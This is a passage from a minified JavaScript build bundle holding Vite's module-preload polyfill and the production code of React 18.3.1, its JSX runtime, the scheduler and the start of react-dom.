var D0=t=>{throw TypeError(t)};var wf=(t,e,n)=>e.has(t)||D0("Cannot "+n);var U=(t,e,n)=>(wf(t,e,"read from private field"),n?n.call(t):e.get(t)),we=(t,e,n)=>e.has(t)?D0("Cannot add the same private member more than once"):e instanceof WeakSet?e.add(t):e.set(t,n),se=(t,e,n,r)=>(wf(t,e,"write to private field"),r?r.call(t,n):e.set(t,n),n),yt=(t,e,n)=>(wf(t,e,"access private method"),n);var Bc=(t,e,n,r)=>({set _(i){se(t,e,i,n)},get _(){return U(t,e,r)}});function Pk(t,e){for(var n=0;n<e.length;n++){const r=e[n];if(typeof r!="string"&&!Array.isArray(r)){for(const i in r)if(i!=="default"&&!(i in t)){const s=Object.getOwnPropertyDescriptor(r,i);s&&Object.defineProperty(t,i,s.get?s:{enumerable:!0,get:()=>r[i]})}}}return Object.freeze(Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}))}(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function n(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function r(i){if(i.ep)return;i.ep=!0;const s=n(i);fetch(i.href,s)}})();function vE(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}var yE={exports:{}},Zd={},_E={exports:{}},ue={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var nc=Symbol.for("react.element"),Rk=Symbol.for("react.portal"),Ak=Symbol.for("react.fragment"),Ok=Symbol.for("react.strict_mode"),Dk=Symbol.for("react.profiler"),jk=Symbol.for("react.provider"),Mk=Symbol.for("react.context"),Lk=Symbol.for("react.forward_ref"),Fk=Symbol.for("react.suspense"),Uk=Symbol.for("react.memo"),$k=Symbol.for("react.lazy"),j0=Symbol.iterator;function zk(t){return t===null||typeof t!="object"?null:(t=j0&&t[j0]||t["@@iterator"],typeof t=="function"?t:null)}var wE={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},xE=Object.assign,EE={};function qo(t,e,n){this.props=t,this.context=e,this.refs=EE,this.updater=n||wE}qo.prototype.isReactComponent={};qo.prototype.setState=function(t,e){if(typeof t!="object"&&typeof t!="function"&&t!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,t,e,"setState")};qo.prototype.forceUpdate=function(t){this.updater.enqueueForceUpdate(this,t,"forceUpdate")};function CE(){}CE.prototype=qo.prototype;function yg(t,e,n){this.props=t,this.context=e,this.refs=EE,this.updater=n||wE}var _g=yg.prototype=new CE;_g.constructor=yg;xE(_g,qo.prototype);_g.isPureReactComponent=!0;var M0=Array.isArray,SE=Object.prototype.hasOwnProperty,wg={current:null},bE={key:!0,ref:!0,__self:!0,__source:!0};function TE(t,e,n){var r,i={},s=null,o=null;if(e!=null)for(r in e.ref!==void 0&&(o=e.ref),e.key!==void 0&&(s=""+e.key),e)SE.call(e,r)&&!bE.hasOwnProperty(r)&&(i[r]=e[r]);var a=arguments.length-2;if(a===1)i.children=n;else if(1<a){for(var c=Array(a),u=0;u<a;u++)c[u]=arguments[u+2];i.children=c}if(t&&t.defaultProps)for(r in a=t.defaultProps,a)i[r]===void 0&&(i[r]=a[r]);return{$$typeof:nc,type:t,key:s,ref:o,props:i,_owner:wg.current}}function Bk(t,e){return{$$typeof:nc,type:t.type,key:e,ref:t.ref,props:t.props,_owner:t._owner}}function xg(t){return typeof t=="object"&&t!==null&&t.$$typeof===nc}function Vk(t){var e={"=":"=0",":":"=2"};return"$"+t.replace(/[=:]/g,function(n){return e[n]})}var L0=/\/+/g;function xf(t,e){return typeof t=="object"&&t!==null&&t.key!=null?Vk(""+t.key):e.toString(36)}function Eu(t,e,n,r,i){var s=typeof t;(s==="undefined"||s==="boolean")&&(t=null);var o=!1;if(t===null)o=!0;else switch(s){case"string":case"number":o=!0;break;case"object":switch(t.$$typeof){case nc:case Rk:o=!0}}if(o)return o=t,i=i(o),t=r===""?"."+xf(o,0):r,M0(i)?(n="",t!=null&&(n=t.replace(L0,"$&/")+"/"),Eu(i,e,n,"",function(u){return u})):i!=null&&(xg(i)&&(i=Bk(i,n+(!i.key||o&&o.key===i.key?"":(""+i.key).replace(L0,"$&/")+"/")+t)),e.push(i)),1;if(o=0,r=r===""?".":r+":",M0(t))for(var a=0;a<t.length;a++){s=t[a];var c=r+xf(s,a);o+=Eu(s,e,n,c,i)}else if(c=zk(t),typeof c=="function")for(t=c.call(t),a=0;!(s=t.next()).done;)s=s.value,c=r+xf(s,a++),o+=Eu(s,e,n,c,i);else if(s==="object")throw e=String(t),Error("Objects are not valid as a React child (found: "+(e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)+"). If you meant to render a collection of children, use an array instead.");return o}function Vc(t,e,n){if(t==null)return t;var r=[],i=0;return Eu(t,r,"","",function(s){return e.call(n,s,i++)}),r}function Hk(t){if(t._status===-1){var e=t._result;e=e(),e.then(function(n){(t._status===0||t._status===-1)&&(t._status=1,t._result=n)},function(n){(t._status===0||t._status===-1)&&(t._status=2,t._result=n)}),t._status===-1&&(t._status=0,t._result=e)}if(t._status===1)return t._result.default;throw t._result}var Dt={current:null},Cu={transition:null},Wk={ReactCurrentDispatcher:Dt,ReactCurrentBatchConfig:Cu,ReactCurrentOwner:wg};function IE(){throw Error("act(...) is not supported in production builds of React.")}ue.Children={map:Vc,forEach:function(t,e,n){Vc(t,function(){e.apply(this,arguments)},n)},count:function(t){var e=0;return Vc(t,function(){e++}),e},toArray:function(t){return Vc(t,function(e){return e})||[]},only:function(t){if(!xg(t))throw Error("React.Children.only expected to receive a single React element child.");return t}};ue.Component=qo;ue.Fragment=Ak;ue.Profiler=Dk;ue.PureComponent=yg;ue.StrictMode=Ok;ue.Suspense=Fk;ue.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Wk;ue.act=IE;ue.cloneElement=function(t,e,n){if(t==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+t+".");var r=xE({},t.props),i=t.key,s=t.ref,o=t._owner;if(e!=null){if(e.ref!==void 0&&(s=e.ref,o=wg.current),e.key!==void 0&&(i=""+e.key),t.type&&t.type.defaultProps)var a=t.type.defaultProps;for(c in e)SE.call(e,c)&&!bE.hasOwnProperty(c)&&(r[c]=e[c]===void 0&&a!==void 0?a[c]:e[c])}var c=arguments.length-2;if(c===1)r.children=n;else if(1<c){a=Array(c);for(var u=0;u<c;u++)a[u]=arguments[u+2];r.children=a}return{$$typeof:nc,type:t.type,key:i,ref:s,props:r,_owner:o}};ue.createContext=function(t){return t={$$typeof:Mk,_currentValue:t,_currentValue2:t,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},t.Provider={$$typeof:jk,_context:t},t.Consumer=t};ue.createElement=TE;ue.createFactory=function(t){var e=TE.bind(null,t);return e.type=t,e};ue.createRef=function(){return{current:null}};ue.forwardRef=function(t){return{$$typeof:Lk,render:t}};ue.isValidElement=xg;ue.lazy=function(t){return{$$typeof:$k,_payload:{_status:-1,_result:t},_init:Hk}};ue.memo=function(t,e){return{$$typeof:Uk,type:t,compare:e===void 0?null:e}};ue.startTransition=function(t){var e=Cu.transition;Cu.transition={};try{t()}finally{Cu.transition=e}};ue.unstable_act=IE;ue.useCallback=function(t,e){return Dt.current.useCallback(t,e)};ue.useContext=function(t){return Dt.current.useContext(t)};ue.useDebugValue=function(){};ue.useDeferredValue=function(t){return Dt.current.useDeferredValue(t)};ue.useEffect=function(t,e){return Dt.current.useEffect(t,e)};ue.useId=function(){return Dt.current.useId()};ue.useImperativeHandle=function(t,e,n){return Dt.current.useImperativeHandle(t,e,n)};ue.useInsertionEffect=function(t,e){return Dt.current.useInsertionEffect(t,e)};ue.useLayoutEffect=function(t,e){return Dt.current.useLayoutEffect(t,e)};ue.useMemo=function(t,e){return Dt.current.useMemo(t,e)};ue.useReducer=function(t,e,n){return Dt.current.useReducer(t,e,n)};ue.useRef=function(t){return Dt.current.useRef(t)};ue.useState=function(t){return Dt.current.useState(t)};ue.useSyncExternalStore=function(t,e,n){return Dt.current.useSyncExternalStore(t,e,n)};ue.useTransition=function(){return Dt.current.useTransition()};ue.version="18.3.1";_E.exports=ue;var v=_E.exports;const H=vE(v),NE=Pk({__proto__:null,default:H},[v]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Kk=v,Gk=Symbol.for("react.element"),qk=Symbol.for("react.fragment"),Yk=Object.prototype.hasOwnProperty,Qk=Kk.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Xk={key:!0,ref:!0,__self:!0,__source:!0};function kE(t,e,n){var r,i={},s=null,o=null;n!==void 0&&(s=""+n),e.key!==void 0&&(s=""+e.key),e.ref!==void 0&&(o=e.ref);for(r in e)Yk.call(e,r)&&!Xk.hasOwnProperty(r)&&(i[r]=e[r]);if(t&&t.defaultProps)for(r in e=t.defaultProps,e)i[r]===void 0&&(i[r]=e[r]);return{$$typeof:Gk,type:t,key:s,ref:o,props:i,_owner:Qk.current}}Zd.Fragment=qk;Zd.jsx=kE;Zd.jsxs=kE;yE.exports=Zd;var d=yE.exports,PE={exports:{}},on={},RE={exports:{}},AE={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(t){function e(L,z){var Y=L.length;L.push(z);e:for(;0<Y;){var K=Y-1>>>1,Q=L[K];if(0<i(Q,z))L[K]=z,L[Y]=Q,Y=K;else break e}}function n(L){return L.length===0?null:L[0]}function r(L){if(L.length===0)return null;var z=L[0],Y=L.pop();if(Y!==z){L[0]=Y;e:for(var K=0,Q=L.length,X=Q>>>1;K<X;){var Re=2*(K+1)-1,Je=L[Re],ye=Re+1,pt=L[ye];if(0>i(Je,Y))ye<Q&&0>i(pt,Je)?(L[K]=pt,L[ye]=Y,K=ye):(L[K]=Je,L[Re]=Y,K=Re);else if(ye<Q&&0>i(pt,Y))L[K]=pt,L[ye]=Y,K=ye;else break e}}return z}function i(L,z){var Y=L.sortIndex-z.sortIndex;return Y!==0?Y:L.id-z.id}if(typeof performance=="object"&&typeof performance.now=="function"){var s=performance;t.unstable_now=function(){return s.now()}}else{var o=Date,a=o.now();t.unstable_now=function(){return o.now()-a}}var c=[],u=[],p=1,f=null,h=3,E=!1,_=!1,y=!1,C=typeof setTimeout=="function"?setTimeout:null,x=typeof clearTimeout=="function"?clearTimeout:null,w=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function S(L){for(var z=n(u);z!==null;){if(z.callback===null)r(u);else if(z.startTime<=L)r(u),z.sortIndex=z.expirationTime,e(c,z);else break;z=n(u)}}function N(L){if(y=!1,S(L),!_)if(n(c)!==null)_=!0,q(R);else{var z=n(u);z!==null&&J(N,z.startTime-L)}}function R(L,z){_=!1,y&&(y=!1,x(b),b=-1),E=!0;var Y=h;try{for(S(z),f=n(c);f!==null&&(!(f.expirationTime>z)||L&&!O());){var K=f.callback;if(typeof K=="function"){f.callback=null,h=f.priorityLevel;var Q=K(f.expirationTime<=z);z=t.unstable_now(),typeof Q=="function"?f.callback=Q:f===n(c)&&r(c),S(z)}else r(c);f=n(c)}if(f!==null)var X=!0;else{var Re=n(u);Re!==null&&J(N,Re.startTime-z),X=!1}return X}finally{f=null,h=Y,E=!1}}var j=!1,T=null,b=-1,P=5,k=-1;function O(){return!(t.unstable_now()-k<P)}function D(){if(T!==null){var L=t.unstable_now();k=L;var z=!0;try{z=T(!0,L)}finally{z?A():(j=!1,T=null)}}else j=!1}var A;if(typeof w=="function")A=function(){w(D)};else if(typeof MessageChannel<"u"){var V=new MessageChannel,Z=V.port2;V.port1.onmessage=D,A=function(){Z.postMessage(null)}}else A=function(){C(D,0)};function q(L){T=L,j||(j=!0,A())}function J(L,z){b=C(function(){L(t.unstable_now())},z)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(L){L.callback=null},t.unstable_continueExecution=function(){_||E||(_=!0,q(R))},t.unstable_forceFrameRate=function(L){0>L||125<L?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):P=0<L?Math.floor(1e3/L):5},t.unstable_getCurrentPriorityLevel=function(){return h},t.unstable_getFirstCallbackNode=function(){return n(c)},t.unstable_next=function(L){switch(h){case 1:case 2:case 3:var z=3;break;default:z=h}var Y=h;h=z;try{return L()}finally{h=Y}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(L,z){switch(L){case 1:case 2:case 3:case 4:case 5:break;default:L=3}var Y=h;h=L;try{return z()}finally{h=Y}},t.unstable_scheduleCallback=function(L,z,Y){var K=t.unstable_now();switch(typeof Y=="object"&&Y!==null?(Y=Y.delay,Y=typeof Y=="number"&&0<Y?K+Y:K):Y=K,L){case 1:var Q=-1;break;case 2:Q=250;break;case 5:Q=1073741823;break;case 4:Q=1e4;break;default:Q=5e3}return Q=Y+Q,L={id:p++,callback:z,priorityLevel:L,startTime:Y,expirationTime:Q,sortIndex:-1},Y>K?(L.sortIndex=Y,e(u,L),n(c)===null&&L===n(u)&&(y?(x(b),b=-1):y=!0,J(N,Y-K))):(L.sortIndex=Q,e(c,L),_||E||(_=!0,q(R))),L},t.unstable_shouldYield=O,t.unstable_wrapCallback=function(L){var z=h;return function(){var Y=h;h=z;try{return L.apply(this,arguments)}finally{h=Y}}}})(AE);RE.exports=AE;var Jk=RE.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Zk=v,rn=Jk;function $(t){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+t,n=1;n<arguments.length;n++)e+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+t+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var OE=new Set,vl={};function As(t,e){Ro(t,e),Ro(t+"Capture",e)}function Ro(t,e){for(vl[t]=e,t=0;t<e.length;t++)OE.add(e[t])}var Ir=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Ip=Object.prototype.hasOwnProperty,eP=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,F0={},U0={};function tP(t){return Ip.call(U0,t)?!0:Ip.call(F0,t)?!1:eP.test(t)?U0[t]=!0:(F0[t]=!0,!1)}function nP(t,e,n,r){if(n!==null&&n.type===0)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return r?!1:n!==null?!n.acceptsBooleans:(t=t.toLowerCase().slice(0,5),t!=="data-"&&t!=="aria-");default:return!1}}function rP(t,e,n,r){if(e===null||typeof e>"u"||nP(t,e,n,r))return!0;if(r)return!1;if(n!==null)switch(n.type){case 3:return!e;case 4:return e===!1;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}function jt(t,e,n,r,i,s,o){this.acceptsBooleans=e===2||e===3||e===4,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=n,this.propertyName=t,this.type=e,this.sanitizeURL=s,this.removeEmptyString=o}var dt={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(t){dt[t]=new jt(t,0,!1,t,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(t){var e=t[0];dt[e]=new jt(e,1,!1,t[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(t){dt[t]=new jt(t,2,!1,t.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(t){dt[t]=new jt(t,2,!1,t,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(t){dt[t]=new jt(t,3,!1,t.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(t){dt[t]=new jt(t,3,!0,t,null,!1,!1)});["capture","download"].forEach(function(t){dt[t]=new jt(t,4,!1,t,null,!1,!1)});["cols","rows","size","span"].forEach(function(t){dt[t]=new jt(t,6,!1,t,null,!1,!1)});["rowSpan","start"].forEach(function(t){dt[t]=new jt(t,5,!1,t.toLowerCase(),null,!1,!1)});var Eg=/[\-:]([a-z])/g;function Cg(t){return t[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(t){var e=t.replace(Eg,Cg);dt[e]=new jt(e,1,!1,t,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(t){var e=t.replace(Eg,Cg);dt[e]=new jt(e,1,!1,t,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(t){var e=t.replace(Eg,Cg);dt[e]=new jt(e,1,!1,t,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(t){dt[t]=new jt(t,1,!1,t.toLowerCase(),null,!1,!1)});dt.xlinkHref=new jt("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(t){dt[t]=new jt(t,1,!1,t.toLowerCase(),null,!0,!0)});function Sg(t,e,n,r){var i=dt.hasOwnProperty(e)?dt[e]:null;(i!==null?i.type!==0:r||!(2<e.length)||e[0]!=="o"&&e[0]!=="O"||e[1]!=="n"&&e[1]!=="N")&&(rP(e,n,i,r)&&(n=null),r||i===null?tP(e)&&(n===null?t.removeAttribute(e):t.setAttribute(e,""+n)):i.mustUseProperty?t[i.propertyName]=n===null?i.type===3?!1:"":n:(e=i.attributeName,r=i.attributeNamespace,n===null?t.removeAttribute(e):(i=i.type,n=i===3||i===4&&n===!0?"":""+n,r?t.setAttributeNS(r,e,n):t.setAttribute(e,n))))}var Lr=Zk.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Hc=Symbol.for("react.element"),Gs=Symbol.for("react.portal"),qs=Symbol.for("react.fragment"),bg=Symbol.for("react.strict_mode"),Np=Symbol.for("react.profiler"),DE=Symbol.for("react.provider"),jE=Symbol.for("react.context"),Tg=Symbol.for("react.forward_ref"),kp=Symbol.for("react.suspense"),Pp=Symbol.for("react.suspense_list"),Ig=Symbol.for("react.memo"),Zr=Symbol.for("react.lazy"),ME=Symbol.for("react.offscreen"),$0=Symbol.iterator;function Aa(t){return t===null||typeof t!="object"?null:(t=$0&&t[$0]||t["@@iterator"],typeof t=="function"?t:null)}var Ue=Object.assign,Ef;function Ka(t){if(Ef===void 0)try{throw Error()}catch(n){var e=n.stack.trim().match(/\n( *(at )?)/);Ef=e&&e[1]||""}return`
`+Ef+t}var Cf=!1;function Sf(t,e){if(!t||Cf)return"";Cf=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(e,[])}catch(u){var r=u}Reflect.construct(t,[],e)}else{try{e.call()}catch(u){r=u}t.call(e.prototype)}else{try{throw Error()}catch(u){r=u}t()}}catch(u){if(u&&r&&typeof u.stack=="string"){for(var i=u.stack.split(`
`),s=r.stack.split(`
`),o=i.length-1,a=s.length-1;1<=o&&0<=a&&i[o]!==s[a];)a--;for(;1<=o&&0<=a;o--,a--)if(i[o]!==s[a]){if(o!==1||a!==1)do if(o--,a--,0>a||i[o]!==s[a]){var c=`
`+i[o].replace(" at new "," at ");return t.displayName&&c.includes("<anonymous>")&&(c=c.replace("<anonymous>",t.displayName)),c}while(1<=o&&0<=a);break}}}finally{Cf=!1,Error.prepareStackTrace=n}return(t=t?t.displayName||t.name:"")?Ka(t):""}function iP(t){switch(t.tag){case 5:return Ka(t.type);case 16:return Ka("Lazy");case 13:return Ka("Suspense");case 19:return Ka("SuspenseList");case 0:case 2:case 15:return t=Sf(t.type,!1),t;case 11:return t=Sf(t.type.render,!1),t;case 1:return t=Sf(t.type,!0),t;default:return""}}function Rp(t){if(t==null)return null;if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t;switch(t){case qs:return"Fragment";case Gs:return"Portal";case Np:return"Profiler";case bg:return"StrictMode";case kp:return"Suspense";case Pp:return"SuspenseList"}if(typeof t=="object")switch(t.$$typeof){case jE:return(t.displayName||"Context")+".Consumer";case DE:return(t._context.displayName||"Context")+".Provider";case Tg:var e=t.render;return t=t.displayName,t||(t=e.displayName||e.name||"",t=t!==""?"ForwardRef("+t+")":"ForwardRef"),t;case Ig:return e=t.displayName||null,e!==null?e:Rp(t.type)||"Memo";case Zr:e=t._payload,t=t._init;try{return Rp(t(e))}catch{}}return null}function sP(t){var e=t.type;switch(t.tag){case 24:return"Cache";case 9:return(e.displayName||"Context")+".Consumer";case 10:return(e._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return t=e.render,t=t.displayName||t.name||"",e.displayName||(t!==""?"ForwardRef("+t+")":"ForwardRef");case 7:return"Fragment";case 5:return e;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return Rp(e);case 8:return e===bg?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e}return null}function Oi(t){switch(typeof t){case"boolean":case"number":case"string":case"undefined":return t;case"object":return t;default:return""}}function LE(t){var e=t.type;return(t=t.nodeName)&&t.toLowerCase()==="input"&&(e==="checkbox"||e==="radio")}function oP(t){var e=LE(t)?"checked":"value",n=Object.getOwnPropertyDescriptor(t.constructor.prototype,e),r=""+t[e];if(!t.hasOwnProperty(e)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var i=n.get,s=n.set;return Object.defineProperty(t,e,{configurable:!0,get:function(){return i.call(this)},set:function(o){r=""+o,s.call(this,o)}}),Object.defineProperty(t,e,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(o){r=""+o},stopTracking:function(){t._valueTracker=null,delete t[e]}}}}function Wc(t){t._valueTracker||(t._valueTracker=oP(t))}function FE(t){if(!t)return!1;var e=t._valueTracker;if(!e)return!0;var n=e.getValue(),r="";return t&&(r=LE(t)?t.checked?"true":"false":t.value),t=r,t!==n?(e.setValue(t),!0):!1}function Yu(t){if(t=t||(typeof document<"u"?document:void 0),typeof t>"u")return null;try{return t.activeElement||t.body}catch{return t.body}}function Ap(t,e){var n=e.checked;return Ue({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??t._wrapperState.initialChecked})}function z0(t,e){var n=e.defaultValue==null?"":e.defaultValue,r=e.checked!=null?e.checked:e.defaultChecked;n=Oi(e.value!=null?e.value:n),t._wrapperState={initialChecked:r,initialValue:n,controlled:e.type==="checkbox"||e.type==="radio"?e.checked!=null:e.value!=null}}function UE(t,e){e=e.checked,e!=null&&Sg(t,"checked",e,!1)}function Op(t,e){UE(t,e);var n=Oi(e.value),r=e.type;if(n!=null)r==="number"?(n===0&&t.value===""||t.value!=n)&&(t.value=""+n):t.value!==""+n&&(t.value=""+n);else if(r==="submit"||r==="reset"){t.removeAttribute("value");return}e.hasOwnProperty("value")?Dp(t,e.type,n):e.hasOwnProperty("defaultValue")&&Dp(t,e.type,Oi(e.defaultValue)),e.checked==null&&e.defaultChecked!=null&&(t.defaultChecked=!!e.defaultChecked)}function B0(t,e,n){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var r=e.type;if(!(r!=="submit"&&r!=="reset"||e.value!==void 0&&e.value!==null))return;e=""+t._wrapperState.initialValue,n||e===t.value||(t.value=e),t.defaultValue=e}n=t.name,n!==""&&(t.name=""),t.defaultChecked=!!t._wrapperState.initialChecked,n!==""&&(t.name=n)}function Dp(t,e,n){(e!=="number"||Yu(t.ownerDocument)!==t)&&(n==null?t.defaultValue=""+t._wrapperState.initialValue:t.defaultValue!==""+n&&(t.defaultValue=""+n))}var Ga=Array.isArray;function ao(t,e,n,r){if(t=t.options,e){e={};for(var i=0;i<n.length;i++)e["$"+n[i]]=!0;for(n=0;n<t.length;n++)i=e.hasOwnProperty("$"+t[n].value),t[n].selected!==i&&(t[n].selected=i),i&&r&&(t[n].defaultSelected=!0)}else{for(n=""+Oi(n),e=null,i=0;i<t.length;i++){if(t[i].value===n){t[i].selected=!0,r&&(t[i].defaultSelected=!0);return}e!==null||t[i].disabled||(e=t[i])}e!==null&&(e.selected=!0)}}function jp(t,e){if(e.dangerouslySetInnerHTML!=null)throw Error($(91));return Ue({},e,{value:void 0,defaultValue:void 0,children:""+t._wrapperState.initialValue})}function V0(t,e){var n=e.value;if(n==null){if(n=e.children,e=e.defaultValue,n!=null){if(e!=null)throw Error($(92));if(Ga(n)){if(1<n.length)throw Error($(93));n=n[0]}e=n}e==null&&(e=""),n=e}t._wrapperState={initialValue:Oi(n)}}function $E(t,e){var n=Oi(e.value),r=Oi(e.defaultValue);n!=null&&(n=""+n,n!==t.value&&(t.value=n),e.defaultValue==null&&t.defaultValue!==n&&(t.defaultValue=n)),r!=null&&(t.defaultValue=""+r)}function H0(t){var e=t.textContent;e===t._wrapperState.initialValue&&e!==""&&e!==null&&(t.value=e)}function zE(t){switch(t){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Mp(t,e){return t==null||t==="http://www.w3.org/1999/xhtml"?zE(e):t==="http://www.w3.org/2000/svg"&&e==="foreignObject"?"http://www.w3.org/1999/xhtml":t}var Kc,BE=function(t){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(e,n,r,i){MSApp.execUnsafeLocalFunction(function(){return t(e,n,r,i)})}:t}(function(t,e){if(t.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in t)t.innerHTML=e;else{for(Kc=Kc||document.createElement("div"),Kc.innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=Kc.firstChild;t.firstChild;)t.removeChild(t.firstChild);for(;e.firstChild;)t.appendChild(e.firstChild)}});function yl(t,e){if(e){var n=t.firstChild;if(n&&n===t.lastChild&&n.nodeType===3){n.nodeValue=e;return}}t.textContent=e}var 